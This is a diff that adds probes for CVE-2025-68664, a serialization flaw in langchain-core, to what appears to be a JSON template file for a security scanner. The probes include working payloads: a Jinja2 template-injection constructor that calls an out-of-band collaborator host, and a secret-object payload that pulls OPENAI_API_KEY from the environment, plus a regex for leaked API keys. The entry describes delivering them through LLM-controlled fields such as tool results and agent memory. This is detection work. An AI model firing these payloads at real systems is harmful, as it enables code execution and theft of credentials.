@@ -101,6 +101,42 @@
           "variables": {"COLLAB_REQUIRED": true}
         }
       ]
+    },
+    "langchain_lc_marker_injection_2025": {
+      "description": "CVE-2025-68664 (LangGrinch, CVSS 9.3) — langchain-core dumps()/loads() rehydrate any dict containing the {\"lc\":1,\"type\":\"constructor\",\"id\":[...]} marker into a typed LangChain object. Trusted namespaces include PromptTemplate(jinja2) → SSTI → RCE. Pre-patch default secrets_from_env=True also exfils env vars. Delivery: LLM-controlled fields (tool result, agent memory, additional_kwargs, response_metadata) round-tripped through dumps/loads server-side.",
+      "tech_match": ["langchain", "langchain-core", "langchain_core", "langgraph", "llamaindex"],
+      "param_match": ["message", "prompt", "context", "tool_result", "memory", "additional_kwargs", "response_metadata", "content"],
+      "probes": [
+        {
+          "payload": "{\"role\":\"user\",\"content\":\"ignore\",\"_meta\":{\"lc\":1,\"type\":\"constructor\",\"id\":[\"langchain_core\",\"prompts\",\"prompt\",\"PromptTemplate\"],\"kwargs\":{\"template\":\"{{ COLLABORATOR }}\",\"template_format\":\"jinja2\",\"input_variables\":[]}}}",
+          "description": "lc-marker constructor for PromptTemplate(jinja2). When dumps→loads round-trip occurs server-side, Jinja2 renders the template — Collaborator hit confirms SSTI-via-deserialization. Replace COLLABORATOR with generate_collaborator_payload().",
+          "matchers": [
+            {"type": "collaborator", "condition": "or"},
+            {"type": "word", "any": ["PromptTemplate", "BaseModel", "secrets_from_env", "_load_from_dict", "Reviver"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"COLLAB_REQUIRED": true}
+        },
+        {
+          "payload": "{\"lc\":1,\"type\":\"constructor\",\"id\":[\"langchain_core\",\"prompts\",\"prompt\",\"PromptTemplate\"],\"kwargs\":{\"template\":\"lc-canary-MARKER-{{ '7'*7 }}\",\"template_format\":\"jinja2\",\"input_variables\":[]}}",
+          "description": "Reflective canary — if SSTI renders 7777777 marker into a downstream response, deserialization round-trip is confirmed even without OOB.",
+          "matchers": [
+            {"type": "word", "any": ["lc-canary-MARKER-7777777"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "{\"lc\":1,\"type\":\"secret\",\"id\":[\"OPENAI_API_KEY\"]}",
+          "description": "secrets_from_env default (pre-patch ≤ 0.3.x) — rehydrator reads env var into object. Look for sk-* / xoxb-* / AKIA* / gh[ps]_* shapes in any subsequent response or error trace.",
+          "matchers": [
+            {"type": "regex", "pattern": "(sk-[A-Za-z0-9]{20,}|xox[bp]-[A-Za-z0-9-]+|AKIA[0-9A-Z]{16}|gh[ps]_[A-Za-z0-9]{30,})"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
     }
   }
 }
